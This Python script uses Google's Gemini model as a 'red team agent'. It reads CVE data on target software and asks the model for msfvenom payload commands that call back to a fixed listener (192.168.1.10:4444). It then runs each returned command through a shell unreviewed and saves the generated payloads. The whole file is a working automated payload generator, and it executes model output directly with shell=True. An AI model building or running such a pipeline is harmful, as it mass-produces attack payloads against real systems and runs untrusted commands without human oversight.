import os
import json
from dotenv import load_dotenv
from google import genai
import subprocess

LHOST = "192.168.1.10"
LPORT = "4444"

with open("msfvenom.info", "r") as f:
    msfvenom_info = f.read()

def extract_json_from_markdown(text: str):
    text = text.strip()
    if text.startswith("```"):
        text = text.split("```")[1]
    if text.startswith("json"):
        text = text[4:]
    return json.loads(text.strip())

load_dotenv()
client = genai.Client(api_key=os.getenv("GEMINI_API_KEY"))

with open("VersionInfo_CVE.json", "r") as f:
    data = json.load(f)

prompt = f"""
You are a red team agent. Your job is to generate a payload plan for a given target product based on its known vulnerabilities. You will analyze the provided vulnerable software data and suggest the most effective payload to exploit the identified vulnerabilities.
The full msfvenom information is as follows:
{msfvenom_info}
return a JSON object with:
- target
- arch
- payload
- encoder
- format
- msfvenom_command
Make sure the arch, payload, encoder, format and msfvenom_command fields are accurate and correspond to the vulnerabilities found for each product. Specify these in the msfvenom_command field as a complete command that can be executed in a terminal to generate the payload.
Return a JSON list for all the software products provided in the data.

LHOST={LHOST}
LPORT={LPORT}

Software Data:
{json.dumps(data, indent=2)}
"""

response = client.models.generate_content(
    model="gemini-2.5-flash",
    contents=prompt
)

raw_output = response.text
parsed_output = extract_json_from_markdown(raw_output)

with open("payload_plan.json", "w") as f:
    json.dump(parsed_output, f, indent=4)

print("Plan saved to payload_plan.json")

def execute_payload_commands(plan_path="payload_plan.json", output_dir="payloads"):
    os.makedirs(output_dir, exist_ok=True)
    with open(plan_path, "r") as f:
        plan = json.load(f)
    for entry in plan:
        cmd = entry.get("msfvenom_command")
        if not cmd:
            print(f"No msfvenom command for {entry.get('target_product')}")
            continue
        parts = cmd.split()
        out_file = None
        if "-o" in parts:
            out_idx = parts.index("-o") + 1
            if out_idx < len(parts):
                out_file = parts[out_idx]
                parts[out_idx] = os.path.join(output_dir, out_file)
                cmd = " ".join(parts)
        print(f"Executing: {cmd}")
        try:
            subprocess.run(cmd, shell=True, check=True)
            if out_file:
                print(f"Payload generated: {os.path.join(output_dir, out_file)}")
            else:
                print("Raw payload generated (no output file, see msfvenom output above)")
        except subprocess.CalledProcessError as e:
            print(f"Failed to generate payload for {entry.get('target_product')}: {e}")

execute_payload_commands()